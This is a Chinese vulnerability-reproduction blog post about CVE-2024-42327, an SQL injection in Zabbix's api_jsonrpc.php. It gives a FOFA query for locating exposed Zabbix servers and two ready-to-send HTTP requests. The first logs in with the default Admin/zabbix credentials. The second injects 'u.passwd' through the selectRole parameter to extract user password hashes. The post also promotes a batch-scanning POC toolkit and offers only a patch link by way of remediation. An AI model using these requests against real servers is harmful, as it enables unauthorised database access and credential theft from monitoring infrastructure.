#  Zabbix api_jsonrpc.php接口存在SQL注入漏洞CVE-2024-42327 附POC   
2024-12-4更新  南风漏洞复现文库   2024-12-04 15:08  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Zabbix 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
Zabbix是Zabbix公司的一套开源的监控系统。  
## 2.漏洞描述  
  
Zabbix是Zabbix公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix 6.0.0至6.0.31版本、6.4.0至6.4.16版本和7.0.0版本存在SQL注入漏洞，该漏洞源于CUser类的addRelatedObjects函数中存在SQL注入漏洞，允许攻击者操纵数据库查询。  
  
CVE编号:CVE-2024-42327  
  
CNNVD编号:CNNVD-202411-3698  
  
CNVD编号:  
## 3.影响版本  
  
Zabbix 6.0.0至6.0.31版本、6.4.0至6.4.16版本和7.0.0版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2UYtze4l5HTIN7cibfmibfjyxn6HteXEiaDDd3biabH7tiasjN7lpibI8skYQ/640?wx_fmt=png&from=appmsg "null")  
  
Zabbix api_jsonrpc.php接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="ZABBIX-监控系统"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/api_jsonrpc.php  
  
漏洞数据包，使用默认账号密码获取token  
```
POST /api_jsonrpc.php HTTP/1.1
Content-Type: application/json-rpc
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Content-Length: 106
Expect: 100-continue
Connection: close

{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "Admin", "password": "zabbix"}, "id": 1}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2jUQ0bEjzm7EZ2fUqeYs1Hv7hiaNichLtwLEL6iagiboYdf8ajUR77gbI4w/640?wx_fmt=jpeg&from=appmsg "null")  
  
使用上面获取到的token，发送数据  
```
POST /api_jsonrpc.php HTTP/1.1
Content-Type: application/json-rpc
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Content-Length: 167
Expect: 100-continue
Connection: close

{"jsonrpc": "2.0", "method": "user.get", "params": {"selectRole": ["roleid, u.passwd", "roleid"], "userids": "1"}, "auth": "8575fed5d90754c4d3dd0049d084bdd0", "id": 1}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2tGLFCeMiaoteAqRicXmOYtg4nkeE5RImbCibJHa5PAMS8gaoEWDADEewg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2AAhJRl40L86e15kbqeN3qYAxBKlyeGMVvzvngkS47TVW2Q6ibZaw7mw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2M2TmU2gibEUADhwtP6tR28aHlobpSZt5AEx5eWia9F4wJyYwDzU3boCA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2icwcmibkg12mWicPrqiag2ibeep9LhcKeH0zNp0icdpM2zHPMvcRKRtRz6iaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep23EjXfGiaQsMujar0XicQ5j0MIC3exWTbiaL6JnrZ4OnEhk4b2ndzJxQng/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b1S9TgibdwRVy2DJXcb1ep2KeaQ0hO1GZs3qRKb4STKahQatB1PVgC6wic71uicBS1CDICCZTm1vhog/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
官方补丁 https://support.zabbix.com/browse/ZBX-25623  
## 8.往期回顾  
  
  
[九思OA软件jsoa/dl.jsp存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487916&idx=1&sn=636bdfae861e5c01986212c20de3bdd8&scene=21#wechat_redirect)  
  
  
[jeecg-boot getTotalData接口存在SQL注入漏洞CVE-2024-48307 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487903&idx=1&sn=b35a9a002067a9751d5d1d6db95cbabf&scene=21#wechat_redirect)  
  
  
